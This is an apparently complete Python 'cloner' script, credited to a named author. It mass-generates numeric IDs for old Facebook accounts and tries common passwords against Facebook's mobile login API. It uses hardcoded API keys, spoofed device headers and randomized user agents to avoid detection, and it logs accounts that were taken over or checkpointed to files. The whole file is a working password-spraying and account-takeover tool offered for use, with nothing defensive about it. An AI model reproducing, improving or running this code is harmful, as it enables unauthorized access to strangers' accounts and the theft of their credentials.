'''
File: OLD CLONER
Author: HADI ANHAF AIMAN
Description: 2006 to 2009 series Old Cloning Project
'''

import os,sys,time,json,uuid
import random,string,requests
from concurrent.futures import ThreadPoolExecutor

N = "\x1b[90m"
R = "\x1b[91m"
G = "\x1b[92m"
Y = "\x1b[93m"
W = "\x1b[97m"


loop = 0
oks = []
cps = []
ids = []

gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]
for xd in range(10000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c=f' en-us; {str(gt)}'
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for agent in range(10000):
	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/533.1'
	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(fullagnt)

for nt in range(10000):
    rr=random.randint
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    rx=random.randrange(1, 999)
    xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
    ugen.append(xx)

for mtc in range(10000):
    rr=random.randint
    xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
    ugen.append(xd)

for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
user_agents = [
    "[FBAN/FB4A;FBAV/398.0.0.21.105;FBBV/440587431;FBDM/{density=2.75,width=1080,height=2177};FBLC/es_ES;FBRV/0;FBCR/Digi.Mobil;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/2201117SY;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
    "[FBAN/FB4A;FBAV/376.0.0.12.108;FBBV/383919098;FBDM/{density=2.625,width=1080,height=2186};FBLC/en_US;FBRV/385374673;FBCR/Telstra;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A525F;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]",
    "[FBAN/FB4A;FBAV/351.0.0.38.117;FBBV/347007278;FBDM/{density=3.0,width=1080,height=2107};FBLC/en_GB;FBRV/348304748;FBCR/EE;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1B;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
    "[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338918983;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/342775358;FBCR/Verizon ;FBMF/samsung;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/SM-J327VPP;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
    "[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919016;FBDM/{density=2.75,width=1080,height=2252};FBLC/es_LA;FBRV/341438384;FBCR/Movistar;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2101K9G;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
    "[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919009;FBDM/{density=2.8125,width=1080,height=2162};FBLC/en_US;FBRV/340870045;FBCR/T-Mobile;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/LE2117;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
    "[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919018;FBDM/{density=3.375,width=1080,height=2150};FBLC/es_LA;FBRV/340539389;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
    "[FBAN/FB4A;FBAV/347.0.0.28.237;FBBV/337279650;FBDM/{density=3.0,width=1080,height=2128};FBLC/ar_AR;FBRV/339429283;FBCR/Mobily;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/INE-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
    "[FBAN/FB4A;FBAV/344.0.0.34.116;FBBV/331704273;FBDM/{density=2.0,width=1200,height=2000};FBLC/es_LA;FBRV/333390281;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/BAH3-W59;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
    "[FBAN/FB4A;FBAV/404.0.0.35.70;FBBV/451474154;FBDM/{density=2.625,width=1080,height=2270};FBLC/id_ID;FBRV/0;FBCR/XL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A715F;FBSV/13;FBOP/19;FBCA/arm64-v8a:;]",
    "[FBAN/FB4A;FBAV/25.0.0.52.53;FBBV/20097162;FBDM/{density=1.4,width=1450,height=2570};FBLC/en_US;FBCR/AT&T;FBMF/Motorola;FBBD/Motorola;FBPN/com.facebook.katana;FBDV/Moto G Stylus (2021);FBSV/7.1.1;nullFBCA/armeabi-v7a:armeabi;]"
]
def main():
    os.system("clear")
    detail = {"AUTHOR":"HADI ANHAF AIMAN","TELEGRAM":"MR-CODE-143","FEATURE":"2006-9 CLONER","VERSION":"1.5 FREE"}
    print(json.dumps(detail,indent=4))
    print(36*"-")
    tool = ["2006","2007","2008","2009"]
    for a,b in enumerate(tool,start=1):
        print(f"({Y}{a}{W}) -> START {G}{b}{W} CLONE")
    print(36*"-")
    Tapisha = input(f" {W}-> SELECT :{G} ")
    if Tapisha == "1":start_clone(series=2006)
    elif Tapisha == "2":start_clone(series=2007)
    elif Tapisha == "3":start_clone(series=2008)
    elif Tapisha == "4":start_clone(series=2009)
    else:start_clone(seris=2009)

def start_clone(series=None):
    if series == 2006:
        mdx = str(random.randint(1,9))
        length = 6
    elif series == 2007:
        mdx = str(random.randint(1,9))
        length = 7
    elif series == 2008:
        mdx = str(random.randint(1,9))
        length = 8
    elif series == 2009:
        mdx = "1000000000"
        length = 6
    try:
        for ____ in range(5000):
            gEn = "".join(random.choice(string.digits) for _ in range(length))
            ids.append(gEn)
        with ThreadPoolExecutor(max_workers=50) as MrCode143:
            print(f" {W}-> TOTAL IDS : {G}{str(len(ids))}")
            print(f" {W}-> THE PROCESS HAS BEEN STARTED...")
            print(36*"-")
            for user in ids:
                email = mdx + user
                passlist = ["123456","1234567","12345678","123456789","11223344","786786","102030"]
                MrCode143.submit(OwnerApi,email,passlist)
        print(36*"\n-")
        print(f" {W}-> TOTAL OKS : {G}{str(len(oks))}")
        print(f" {W}-> TOTAL CPS : {R}{str(len(cps))}")
        sys.exit(36*f"{W}-")
    except Exception as e:
        sys.exit(e)


def OwnerApi(ids,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r {W}-> AWM-XD|{Y}{loop}{W}|OK/CP|•| {G}{len(oks)}{N}/{R}{len(cps)}")
    sys.stdout.flush()
    try:
        for pas in passlist:
            ua = str(random.choice(ugen))
            shahariar=random.choice(user_agents)
            data = {'adid':str(uuid.uuid4()),
            'email':ids,
            'password':pas,
            'cpl':'true',
            'credentials_type':'device_based_login_password',
            "source": "device_based_login",
            'error_detail_type':'button_with_disabled',
            'format':'json',
            'generate_session_cookies':'1',
            'generate_analytics_claim':'1',
            'generate_machine_id':'1',
            "family_device_id": str(uuid.uuid4()),
            "advertiser_id": str(uuid.uuid4()),
            "locale":"en_US","client_country_code":"US",
            "device_id": str(uuid.uuid4()),
            "method": "auth.login",
            "api_key": "882a8490361da98702bf97a021ddc14d",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
            header = {
            'content-type':'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'x-fb-sim-hni':str(random.randint(20000,40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'user-agent':shahariar,
            'x-fb-net-hni':str(random.randint(20000,40000)),
            'x-fb-device-group': '5120',
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'x-fb-connection-bandwidth':str(random.randint(20000000,30000000)),
            'x-fb-connection-quality':'EXCELLENT',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
            'x-fb-friendly-name':'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'accept-encoding':'gzip, deflate',
            'x-fb-http-engine':'Liger'}
            url = "https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true"
            response = requests.post(url,data=data,headers=header).json()
            if "access_token" in response:
                print(f"\r\r {W}-> {G}AWM-OK • {ids} • {pas}")
                open("/sdcard/MRCODE143-OLD-OK.txt","a").write(uid+"|"+pas+"\n")
                oks.append(ids)
            elif "www.facebook.com" in response["error"]["message"]:
                print(f"\r\r {W}-> {R}AWM-CP • {ids} • {pas}")
                open("/sdcard/MRCODE143-OLD-CP.txt","a").write(uid+"|"+pas+"\n")
                cps.append(ids)
            else:continue
        loop += 1
    except Exception as e:
        pass

if __name__ == '__main__':
    main()